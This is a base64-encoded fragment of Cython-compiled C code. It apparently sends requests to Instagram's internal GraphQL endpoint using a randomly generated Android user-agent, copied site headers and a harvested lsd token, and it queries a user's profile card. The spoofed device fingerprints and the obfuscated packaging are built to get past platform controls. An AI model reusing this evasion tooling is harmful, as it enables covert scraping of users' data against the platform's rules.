5eF9uX3VfSFRDKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUyk7CiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9BU1VTKTsKICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCA0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQVNVUykgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MNV9lcnJvcik7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1pURSk7CiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpOwogICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9aVEUpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKTsKICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09ORVBMVVMpOwogICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PTkVQTFVTKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfWElBT01JKTsKICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSk7CiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgNywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1hJQU9NSSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MNV9lcnJvcik7CiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pOwogICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfT1BQTyk7CiAgICAgICAgICBpZiAoX19QeXhfUHlMaXN0X1NFVF9JVEVNKF9fcHl4X3RfNCwgOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X09QUE8pICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKTsKICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1ZJVk8pOwogICAgICAgICAgaWYgKF9fUHl4X1B5TGlzdF9TRVRfSVRFTShfX3B5eF90XzQsIDksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9WSVZPKSAhPSAoMCkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKTsKICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfU09OWSk7CiAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9TT05ZKTsKICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAxMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1NPTlkpICE9ICgwKSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUFMTUUpOwogICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVBTE1FKTsKICAgICAgICAgIGlmIChfX1B5eF9QeUxpc3RfU0VUX0lURU0oX19weXhfdF80LCAxMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JFQUxNRSkgIT0gKDApKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MNV9lcnJvcik7CiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRvbSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZGludCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19weXhfdF82ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzIxXSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF81LCBfX3B5eF90XzcpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19weXhfdF83ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9TTV9UKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF83LCBfX3B5eF92X3JuZCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19weXhfdF83ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9TTV9UKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF83LCBfX3B5eF92X3JuZCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19weXhfdF83ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9xY29tX2VuX1VTXzU0NTk4Nik7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JhbmRpbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVsyMl0sIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNDA3LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX3B5eF90XzYgPSBQeU51bWJlcl9BZGQoX19weXhfdF83LCBfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgICAgX19weXhfdF81ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDcsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfdXNlcl9hZ2VudCwgX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzYgPSBOVUxMOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kX2lkcyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQwOCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fcHl4X3RfOCA9IDE7CiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF83KSkpIHsKICAgICAgICAgICAgX19weXhfdF82ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF83KTsKICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7CiAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF83KTsKICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7CiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNywgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgICAgX19weXhfdF84ID0gMDsKICAgICAgICAgIH0KICAgICAgICAgICNlbmRpZgogICAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF82LCBfX3B5eF92X2JiaywgX19weXhfdl9JZG99OwogICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzcsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOCwgKDMtX19weXhfdF84KSB8IChfX3B5eF90XzgqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwOCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgfQogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9JZCwgX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF9wZl8ybmVfM3V1dV9nZW5leHByKE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9HZW5lcmF0b3JfR2V0SW5saW5lZFJlc3VsdChfX3B5eF90XzUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNykpIF9fUFlYX0VSUigwLCA0MDksIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgIF9fcHl4X3RfNSA9IFB5VW5pY29kZV9Kb2luKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzIsIF9fcHl4X3RfNyk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQwOSwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9sc2QsICgoUHlPYmplY3QqKV9fcHl4X3RfNSkpOwogICAgICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQxMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9hY2NlcHQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzMpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDEyLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYWNjZXB0X2xhbmd1YWdlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2VuX2VuX1VTX3FfMF85KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQxMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRlbnRfdHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQxMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG50LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzEpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDEyLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcmlnaW4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDEyLCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wcmlvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91XzFfaSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MTIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlZmVyZXIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfaHR0cHNfd3d3X2luc3RhZ3JhbV9jb21fY3Jpc3RpYW4pIDwgKDApKSBfX1BZWF9FUlIoMCwgNDEyLCBfX3B5eF9MNV9lcnJvcikKCiAgICAgICAgICAKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdl91c2VyX2FnZW50KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQxMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3hfZmJfZnJpZW5kbHlfbmFtZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BvbGFyaXNVc2VySG92ZXJDYXJkQ29udGVudFYyUXVlKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQxMiwgX19weXhfTDVfZXJyb3IpCgogICAgICAgICAgCiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3hfZmJfbHNkLCBfX3B5eF92X2xzZCkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MTIsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9oZWFkZXJzLCAoKFB5T2JqZWN0KilfX3B5eF90XzUpKTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoNik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sc2QsIF9fcHl4X3ZfbHNkKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmJfYXBpX2NhbGxlcl9jbGFzcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1JlbGF5TW9kZXJuKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmJfYXBpX3JlcV9mcmllbmRseV9uYW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUG9sYXJpc1VzZXJIb3ZlckNhcmRDb250ZW50VjJRdWUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MNV9lcnJvcikKCiAgICAgICAgICAKICAgICAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUoX19weXhfdl9JZCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV91c2VySUQsIF9fcHl4X3RfNyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgICAgX19weXhfdF83ID0gX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3VzZXJuYW1lX2NyaXN0aWFubyk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDQyNywgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ZhcmlhYmxlcywgX19weXhfdF83KSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyNCwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zZXJ2ZXJfdGltZXN0YW1wcywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RydWUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDI0LCBfX3B5eF9MNV9lcnJvcikKICAgICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kb2NfaWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNzcxNzI2OTQ4ODMzNjAwMSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MjQsIF9fcHl4X0w1X2Vycm9yKQogICAgICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9kYXRhLCAoKFB5T2JqZWN0KilfX3B5eF90XzUpKTsKICAgICAgICAgIF9fcHl4X3RfNSA9IDA7CgogICAgICAgICAgCiAgICAgICAgICBfX3B5eF90XzcgPSBOVUxMOwogICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTsKICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcG9zdCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQzMiwgX19weXhfTDVfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF84ID0gMTsKICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgICAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzQpKSkgewogICAgICAgICAgICBfX3B5eF90Xzcg